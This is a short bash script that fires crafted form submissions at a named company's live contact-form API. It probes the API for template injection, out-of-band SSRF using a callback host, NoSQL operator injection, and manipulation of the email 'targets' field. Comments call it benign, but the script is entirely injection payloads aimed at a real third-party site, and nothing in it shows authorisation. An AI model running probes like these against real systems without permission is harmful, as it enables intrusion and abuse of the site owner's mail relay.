#!/bin/bash
B=https://www.infinitycapital.bh/api/send
# benign: single message, targets = site's own inbox (already in client payload)
post(){ curl -s -m 30 -X POST "$B" \
 -F "fname=a" -F "lname=b" -F "areacode=+973" -F "tel=3600000" \
 -F "cname=a" -F "subject=Investment Opportunities" -F "msg=$1" \
 -F "check=true" -F "targets=$2" -w "\n[%{http_code}]\n" | head -c 400; }

echo "### 1 targets=own-inbox (baseline accepted shape)"
post "hello" "info@infinitycapital.bh"
echo "### 2 SSTI arithmetic {{7*7}}"
post "{{7*7}}" "info@infinitycapital.bh"
echo "### 3 SSTI \${7*7}"
post '${7*7}' "info@infinitycapital.bh"
echo "### 4 SSRF-ish url in msg"
post "http://oobf573f4f78b9b.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/ssrf-msg" "info@infinitycapital.bh"
echo "### 5 CRLF header inject in fname"
post "hdr" "info@infinitycapital.bh"
echo "### 6 NoSQL operator"
post '{"$ne":null}' "info@infinitycapital.bh"
echo "### 7 targets=external attacker mailbox? (do NOT) - instead targets=[]"
post "t" ""
echo "### 8 duplicate targets field"
curl -s -m 30 -X POST "$B" -F "fname=a" -F "lname=b" -F "areacode=+973" -F "tel=3" -F "cname=a" -F "subject=Investment Opportunities" -F "msg=dup" -F "check=true" -F "targets=info@infinitycapital.bh" -F "targets=info@infinitycapital.bh" -w "\n[%{http_code}]\n" | head -c 300
